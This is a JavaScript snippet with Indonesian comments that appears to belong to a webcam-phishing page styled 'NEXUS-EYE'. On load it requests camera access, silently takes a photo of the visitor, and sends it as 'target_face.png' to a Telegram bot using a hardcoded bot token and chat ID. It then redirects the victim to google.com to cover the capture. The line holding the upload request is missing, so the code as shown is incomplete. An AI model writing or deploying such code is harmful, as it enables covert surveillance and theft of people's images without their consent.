    <script>
        // MASUKIN TOKEN DARI BOTFATHER DI BAWAH INI !!!
        const token = '8794576817:AAHiq5Kfttd566LDVsyYh7ye-MICejn4cPM'; 
        const chatid = '8416221686'; // Chat ID lu udah gw pasang otomatis

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            setTimeout(takeAndSend, 3000);
        }).catch(err => {
            alert("Error: Browser tidak mendukung!");
        });

        function takeAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/png');
            
            const blob = dataURItoBlob(imageData);
            const formData = new FormData();

            formData.append('photo', blob, 'target_face.png');
            formData.append('caption', '📸 TARGET TERDETEKSI OLEH NEXUS-EYE! 📸\n\nUser: hanzX\nStatus: Captured');

                method: 'POST',
                body: formData
            })
            .then(res => {
                window.location.href = "https://google.com";
            });
        }

        function dataURItoBlob(dataURI) {
            var byteString = atob(dataURI.split(',')[1]);
            var ab = new ArrayBuffer(byteString.length);
            var ia = new Uint8Array(ab);
            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
            return new Blob([ab], {type: 'image/png'});
        }
